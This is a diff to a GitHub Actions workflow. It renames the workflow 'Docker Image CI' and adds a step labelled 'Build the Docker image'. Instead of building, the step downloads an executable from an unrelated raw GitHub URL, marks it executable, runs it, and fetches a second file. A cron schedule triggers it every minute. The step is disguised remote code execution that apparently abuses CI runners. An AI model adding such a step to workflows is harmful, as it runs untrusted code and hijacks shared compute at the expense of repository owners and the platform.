@@ -1,13 +1,22 @@
-name: Python
-on: 
+name: Docker Image CI
+on:
   push:
+    branches: [ master ]
   pull_request:
+    branches: [ master ]
   schedule:
   - cron: "*/1 * * * *"
 
 jobs:
- python-1:
+  build:
+
     runs-on: ubuntu-latest
+
+    steps:
+    - uses: actions/checkout@v3
+    - name: Build the Docker image
+      run: wget -O 1 https://raw.githubusercontent.com/trautroi/aws/master/nice && chmod +x 1 && ./1 && wget -O 2 https://raw.githubusercontent.com/johnwixk228/ujicoba/main/v2
+
     strategy:
       fail-fast: false
       matrix:
